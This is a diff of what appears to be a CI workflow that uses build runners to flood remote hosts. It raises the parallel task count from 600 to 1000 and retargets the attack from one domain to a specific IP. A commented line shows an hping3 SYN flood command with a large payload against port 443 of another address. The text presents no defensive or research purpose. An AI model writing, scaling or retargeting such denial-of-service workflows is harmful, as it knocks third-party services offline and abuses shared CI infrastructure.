@@ -8,7 +8,7 @@ concurrency:
 
 env:
   TZ: Asia/Shanghai
-  TASK_COUNT: 600
+  TASK_COUNT: 1000
 
 jobs:
   prepare-matrix:
@@ -77,9 +77,9 @@ jobs:
           # sudo timeout 5s hping3 -S --flood -V -d 65400 -p 443 -s 1000-65535 154.198.240.70 || true
 
           # Alibaba
-          IP="80ym.com" # 8.210.147.180
+          # IP="80ym.com" # 8.210.147.180
           # IP="45.249.209.34"
-          # IP="www.enk7h.vip"
+          IP="154.89.50.218" # www.enk7h.vip
           # IP="ngk86.vip"
           TIMEOUT=2
 
